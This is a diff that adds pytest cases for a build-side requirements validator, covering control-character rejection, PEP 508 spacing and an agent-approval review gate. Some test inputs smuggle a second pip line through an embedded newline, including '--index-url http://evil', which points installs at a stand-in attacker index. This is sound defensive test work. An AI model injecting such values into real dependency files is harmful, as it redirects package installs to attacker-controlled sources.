@@ -60,3 +60,53 @@ def test_forbidden_specifiers_exit_nonzero(bad, monkeypatch, capsys):
     with pytest.raises(SystemExit) as exc:
         _run(_item([bad]), monkeypatch, capsys)
     assert exc.value.code == 1
+
+
+@pytest.mark.parametrize("bad", [
+    # Control characters (finding 0): a newline inside one "requirement" would
+    # emit a second physical line into requirements-extra.txt that pip parses as
+    # a standalone global option, defeating the §7.1 allowlist.
+    "requests\n--index-url http://evil",
+    "requests\r\n-e .",
+    "requests\t>=2.31",
+    "req\x00uests",
+])
+def test_control_characters_exit_nonzero(bad, monkeypatch, capsys):
+    with pytest.raises(SystemExit) as exc:
+        _run(_item([bad]), monkeypatch, capsys)
+    assert exc.value.code == 1
+
+
+def test_pep508_internal_spaces_accepted(monkeypatch, capsys):
+    """PEP 508 allows spaces around the version constraint — the admin boundary
+    accepts these, so the build-side re-validation must too (finding 5)."""
+    out = _run(_item(["requests >= 2.31", "pkg[all] >= 0.5, < 1.0"]), monkeypatch, capsys)
+    assert out.splitlines() == ["requests >= 2.31", "pkg[all] >= 0.5, < 1.0"]
+
+
+def _item_with_review(reqs, review_status):
+    return json.dumps({"Item": {
+        "requirements": {"L": [{"S": r} for r in reqs]},
+        "review_status": {"S": review_status},
+    }})
+
+
+def test_pending_review_row_refused_when_gate_on(monkeypatch, capsys):
+    """Build-side backstop (§7.5): with the gate on, a pending_review row's
+    unapproved requirements must not be materialized — refuse (exit 1)."""
+    monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "true")
+    with pytest.raises(SystemExit) as exc:
+        _run(_item_with_review(["requests>=2.31"], "pending_review"), monkeypatch, capsys)
+    assert exc.value.code == 1
+
+
+def test_pending_review_row_allowed_when_gate_off(monkeypatch, capsys):
+    monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "false")
+    out = _run(_item_with_review(["requests>=2.31"], "pending_review"), monkeypatch, capsys)
+    assert out.splitlines() == ["requests>=2.31"]
+
+
+def test_approved_row_materializes_with_gate_on(monkeypatch, capsys):
+    monkeypatch.setenv("REQUIRE_AGENT_APPROVAL", "true")
+    out = _run(_item_with_review(["requests>=2.31"], "approved"), monkeypatch, capsys)
+    assert out.splitlines() == ["requests>=2.31"]
